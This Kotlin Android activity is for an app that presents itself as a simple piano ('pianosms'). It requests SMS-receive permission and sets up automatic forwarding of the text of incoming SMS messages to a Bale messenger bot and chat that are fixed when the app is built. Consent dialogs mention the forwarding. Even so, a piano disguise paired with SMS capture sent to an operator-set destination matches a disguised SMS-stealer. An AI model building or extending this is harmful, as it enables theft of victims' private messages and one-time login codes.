package com.example.pianosms

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.media.SoundPool
import android.os.Bundle
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.SeekBar
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.widget.SwitchCompat
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {
    private lateinit var statusText: TextView
    private lateinit var soundPool: SoundPool
    private val pianoSamples = mutableListOf<Int>()
    private var volume = 65
    private var metronomeOn = false

    companion object {
        private const val REQUEST_SMS_PERMISSION = 1001
        private const val REQUEST_CONTACTS_PERMISSION = 1002
    }

    private val prefs by lazy { getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestedOrientation = android.content.pm.ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE
        setContentView(R.layout.activity_main)
        statusText = findViewById(R.id.statusText)

        soundPool = SoundPool.Builder().setMaxStreams(16).build()
        pianoSamples.clear()
        pianoSamples.addAll(listOf(
            soundPool.load(this, R.raw.piano_c4, 1),
            soundPool.load(this, R.raw.piano_d4, 1),
            soundPool.load(this, R.raw.piano_e4, 1),
            soundPool.load(this, R.raw.piano_f4, 1),
            soundPool.load(this, R.raw.piano_g4, 1),
            soundPool.load(this, R.raw.piano_a4, 1),
            soundPool.load(this, R.raw.piano_b4, 1)
        ))
        val keys = listOf(R.id.key1, R.id.key2, R.id.key3, R.id.key4, R.id.key5, R.id.key6, R.id.key7)
        keys.forEachIndexed { index, id ->
            findViewById<Button>(id).setOnClickListener { playNote(index) }
        }

        findViewById<Button>(R.id.settingsButton).setOnClickListener { showSettings() }
        findViewById<Button>(R.id.volumeButton).setOnClickListener { showVolume() }
        findViewById<Button>(R.id.metronomeButton).setOnClickListener {
            metronomeOn = !metronomeOn
            statusText.text = if (metronomeOn) "مترونوم روشن" else "مترونوم خاموش"
            if (metronomeOn) playNote(0)
        }
        findViewById<Button>(R.id.testButton).setOnClickListener { testBaleConnection() }
        findViewById<Button>(R.id.forwardButton).setOnClickListener { toggleForwarding() }
        findViewById<Button>(R.id.powerButton).setOnClickListener {
            statusText.text = "پیانو آماده است"
            playNote(4)
        }
        findViewById<Button>(R.id.menuButton).setOnClickListener { showSettings() }
        findViewById<Button>(R.id.recordButton).setOnClickListener {
            Toast.makeText(this, "ضبط در این نسخه پشتیبانی نمی‌شود", Toast.LENGTH_SHORT).show()
        }
        findViewById<Button>(R.id.modeButton).setOnClickListener {
            statusText.text = "حالت پیانو"
        }
        findViewById<Button>(R.id.settingsButton2).setOnClickListener { showSettings() }
        findViewById<Button>(R.id.powerButton2).setOnClickListener {
            if (prefs.getBoolean(Constants.KEY_AUTO_FORWARD, false)) {
                prefs.edit().putBoolean(Constants.KEY_AUTO_FORWARD, false).apply()
                statusText.text = "ارسال خودکار خاموش شد"
            } else {
                showSettings()
            }
        }
        findViewById<Button>(R.id.styleButton).setOnClickListener {
            statusText.text = "صدای پیش‌فرض پیانو انتخاب شد"
            playNote(2)
        }
        findViewById<Button>(R.id.chordButton).setOnClickListener {
            playNote(0); playNote(2); playNote(4)
            statusText.text = "آکورد آزمایشی"
        }
        findViewById<Button>(R.id.mySettingButton).setOnClickListener { showSettings() }

        statusText.text = when {
            !BaleApi.isConfigured() -> "پیانو آماده • اتصال بله هنوز پیکربندی نشده"
            prefs.getBoolean(Constants.KEY_AUTO_FORWARD, false) -> "پیانو آماده • ارسال خودکار فعال"
            else -> "پیانو آماده • اتصال بله آماده است"
        }
        requestInitialPermissions()
    }

    private fun requestInitialPermissions() {
        val missing = mutableListOf<String>()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            missing.add(Manifest.permission.RECEIVE_SMS)
        }
        if (missing.isNotEmpty()) {
            AlertDialog.Builder(this)
                .setTitle("مجوزهای لازم")
                .setMessage("برای فعال‌کردن ارسال پیامک‌های جدید به ربات بله، مجوز پیامک لازم است. پس از تأیید جداگانهٔ ارسال خودکار، پیامک‌های جدید به چت ازپیش‌تنظیم‌شده ارسال می‌شوند.")
                .setNegativeButton("بعداً") { _, _ -> statusText.text = "پیانو آماده • ارسال خودکار خاموش" }
                .setPositiveButton("ادامه") { _, _ ->
                    ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQUEST_SMS_PERMISSION)
                }
                .setCancelable(false)
                .show()
        } else {
            maybeEnableForwardingAfterPermission()
        }
    }

    private fun playNote(index: Int) {
        try {
            val sample = pianoSamples.getOrNull(index) ?: return
            soundPool.play(sample, volume / 100f, volume / 100f, 1, 0, 1.0f)
        } catch (_: Exception) { }
    }

    private fun showSettings() {
        if (prefs.getBoolean(Constants.KEY_AUTO_FORWARD, false)) {
            AlertDialog.Builder(this)
                .setTitle("اتصال بله")
                .setMessage("اتصال این نسخه از قبل در زمان ساخت برنامه تنظیم می‌شود. ارسال خودکار پیامک‌ها اکنون روشن است.")
                .setNegativeButton("بستن", null)
                .setPositiveButton("خاموش‌کردن ارسال") { _, _ ->
                    prefs.edit().putBoolean(Constants.KEY_AUTO_FORWARD, false).apply()
                    statusText.text = "ارسال خودکار خاموش شد"
                }.show()
            return
        }
        AlertDialog.Builder(this)
            .setTitle("اتصال بله")
            .setMessage(
                if (BaleApi.isConfigured())
                    "اتصال بله از قبل تنظیم شده است. با فعال‌سازی، متن پیامک‌های جدید این گوشی به چت ازپیش‌تنظیم‌شده فرستاده می‌شود."
                else
                    "این نسخه هنوز با اطلاعات امن بات ساخته نشده است؛ تا پیکربندی اتصال، ارسال پیامک فعال نمی‌شود."
            )
            .setNegativeButton("لغو", null)
            .setPositiveButton("فعال‌سازی") { _, _ -> enableForwarding() }
            .show()
    }

    private fun toggleForwarding() {
        if (prefs.getBoolean(Constants.KEY_AUTO_FORWARD, false)) {
            prefs.edit().putBoolean(Constants.KEY_AUTO_FORWARD, false).apply()
            statusText.text = "ارسال خودکار خاموش شد"
        } else showSettings()
    }

    private fun enableForwarding() {
        if (!BaleApi.isConfigured()) {
            statusText.text = "اتصال بله هنوز پیکربندی نشده"
            Toast.makeText(this, "نسخهٔ نهایی باید با اطلاعات امن بات ساخته شود", Toast.LENGTH_LONG).show()
            return
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.RECEIVE_SMS), REQUEST_SMS_PERMISSION)
            return
        }
        if (!prefs.getBoolean(Constants.KEY_FORWARD_CONSENT, false)) {
            AlertDialog.Builder(this)
                .setTitle("تأیید ارسال خودکار")
                .setMessage("با روشن‌کردن این قابلیت، متن پیامک‌های جدید این گوشی به ربات بله و چت ازپیش‌تنظیم‌شده ارسال می‌شود.")
                .setNegativeButton("لغو", null)
                .setPositiveButton("تأیید و فعال‌سازی") { _, _ ->
                    prefs.edit().putBoolean(Constants.KEY_FORWARD_CONSENT, true)
                        .putBoolean(Constants.KEY_AUTO_FORWARD, true).apply()
                    statusText.text = "پیانو آماده • ارسال خودکار فعال"
                }.show()
        } else {
            prefs.edit().putBoolean(Constants.KEY_AUTO_FORWARD, true).apply()
            statusText.text = "پیانو آماده • ارسال خودکار فعال"
        }
    }

    private fun maybeEnableForwardingAfterPermission() {
        if (BaleApi.isConfigured() &&
            prefs.getBoolean(Constants.KEY_FORWARD_CONSENT, false)) {
            prefs.edit().putBoolean(Constants.KEY_AUTO_FORWARD, true).apply()
            statusText.text = "پیانو آماده • ارسال خودکار فعال"
        }
    }

    private fun showVolume() {
        val seek = SeekBar(this).apply { max = 100; progress = volume }
        val box = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(40, 20, 40, 4)
            addView(seek)
        }
        AlertDialog.Builder(this).setTitle("تنظیم صدا").setView(box)
            .setPositiveButton("انجام شد") { _, _ ->
                volume = seek.progress.coerceAtLeast(1)
                // SoundPool volume is applied when each note is played.
            }.show()
    }

    private fun testBaleConnection() {
        statusText.text = "در حال ارسال پیام آزمایشی…"
        BaleApi.sendMessage(this, "🎹 اتصال پیانوی شما به بله برقرار است.") { ok, error ->
            runOnUiThread {
                statusText.text = if (ok) "اتصال بله موفق بود" else "خطا در اتصال: ${error ?: "نامشخص"}"
                Toast.makeText(this, statusText.text, Toast.LENGTH_LONG).show()
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_SMS_PERMISSION) {
            val granted = grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED
            if (granted) {
                statusText.text = "مجوز دریافت شد؛ تنظیمات بله را باز کن"
                maybeEnableForwardingAfterPermission()
            } else statusText.text = "مجوز داده نشد؛ ارسال خودکار خاموش است"
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (::soundPool.isInitialized) soundPool.release()
        pianoSamples.clear()
    }
}
